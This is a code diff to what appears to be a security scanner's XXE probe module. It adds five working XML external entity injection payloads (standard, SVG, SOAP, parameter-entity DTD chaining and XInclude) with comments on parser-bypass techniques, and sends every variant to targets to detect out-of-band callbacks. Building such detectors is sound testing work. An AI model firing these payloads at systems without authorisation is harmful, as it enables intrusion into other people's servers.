@@ -12,7 +12,71 @@ from modules.base import BaseModule
 from modules.vulnscan import VulnScanModule
 
 
-XML_HINTS = (".xml", "/xml", "soap", "saml", "wsdl", "upload", "import", "parse")
+# Path/query tokens that suggest a server-side XML parser is in play.
+# Sourced from PayloadsAllTheThings/XXE Injection plus common Office/SOAP/SAML routes.
+XML_HINTS = (
+    ".xml", "/xml", "xmlrpc",
+    "soap", "wsdl", "saml", "sso",
+    "upload", "import", "export", "parse",
+    ".docx", ".xlsx", ".pptx", ".odt", ".svg",
+    "rss", "atom", "feed", "rest/xml",
+    "wp-content", "axis2", "openidp",
+)
+
+
+def _xxe_payload_variants(payload_url: str) -> list[tuple[str, str, str]]:
+    """Return a catalogue of (variant_name, content_type, body) XXE payloads.
+
+    Each variant targets a different parser context: standard XML, SVG image,
+    SOAP envelope, Office XML, and parameter-entity DTD chaining. The detector
+    fires on whichever variant triggers an OOB callback.
+    """
+    return [
+        (
+            "standard_external_entity",
+            "application/xml",
+            '<?xml version="1.0"?>\n'
+            '<!DOCTYPE reconx [ <!ENTITY xxe SYSTEM "' + payload_url + '"> ]>\n'
+            "<reconx>&xxe;</reconx>",
+        ),
+        (
+            "svg_external_entity",
+            "image/svg+xml",
+            '<?xml version="1.0" standalone="no"?>\n'
+            '<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "' + payload_url + '"> ]>\n'
+            '<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>',
+        ),
+        (
+            "soap_envelope_xxe",
+            "text/xml; charset=utf-8",
+            '<?xml version="1.0" encoding="utf-8"?>\n'
+            '<!DOCTYPE soap:Envelope [ <!ENTITY xxe SYSTEM "' + payload_url + '"> ]>\n'
+            '<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">'
+            "<soap:Body><reconx>&xxe;</reconx></soap:Body>"
+            "</soap:Envelope>",
+        ),
+        (
+            "parameter_entity_dtd_chain",
+            "application/xml",
+            # Parameter entities are evaluated inside the DTD itself, which bypasses
+            # parsers that block direct &xxe; expansion in the document body.
+            '<?xml version="1.0"?>\n'
+            '<!DOCTYPE reconx [\n'
+            ' <!ENTITY % param SYSTEM "' + payload_url + '?dtd">\n'
+            ' %param;\n'
+            "]>\n"
+            "<reconx>reconx</reconx>",
+        ),
+        (
+            "xinclude_external",
+            "application/xml",
+            # XInclude bypasses parsers that disable the DOCTYPE declaration.
+            '<?xml version="1.0"?>\n'
+            '<reconx xmlns:xi="http://www.w3.org/2001/XInclude">'
+            '<xi:include href="' + payload_url + '" parse="text"/>'
+            "</reconx>",
+        ),
+    ]
 
 
 class XXEProbeModule(BaseModule):
@@ -56,25 +120,39 @@ class XXEProbeModule(BaseModule):
         session.verify = False
         try:
             for idx, url in enumerate(targets):
+                # Each target gets a unique token + the full variant catalogue.
+                # The variant whose parser context the server actually accepts is
+                # the one that will produce an OOB callback; the rest are harmless.
                 token = f"xxe{idx:04d}"
                 payload_url = self._oob_payload(callback, token)
-                body = self._xml_payload(payload_url)
-                resp = self.http_request(
-                    "POST", url, session=session, safe_readonly=True,
-                    headers={"Content-Type": "application/xml"},
-                    data=body,
-                    timeout=float(cfg.get("timeout", 10)), verify=False,
-                )
-                sent.append({"token": token, "url": url, "payload_url": payload_url, "status": getattr(resp, "status_code", None)})
+                for variant_name, content_type, body in _xxe_payload_variants(payload_url):
+                    resp = self.http_request(
+                        "POST", url, session=session, safe_readonly=True,
+                        headers={"Content-Type": content_type},
+                        data=body,
+                        timeout=float(cfg.get("timeout", 10)), verify=False,
+                    )
+                    sent.append({
+                        "token": token,
+                        "url": url,
+                        "variant": variant_name,
+                        "content_type": content_type,
+                        "payload_url": payload_url,
+                        "status": getattr(resp, "status_code", None),
+                    })
 
             wait = float(cfg.get("oob_wait", runtime.get("cooldown_period", 5)))
             if wait > 0:
                 time.sleep(wait)
             interactions = self._read_oob_interactions(runtime)
             findings = []
+            seen_tokens: set[str] = set()
             for item in sent:
+                if item["token"] in seen_tokens:
+                    continue
                 matches = self._matching_interactions(interactions, item["token"])
                 if matches:
+                    seen_tokens.add(item["token"])
                     findings.append(self._finding("xxe_oob_callback", "HIGH", item["url"], "XXE confirmed by OOB callback", {
                         **item,
                         "interactions": matches[:5],
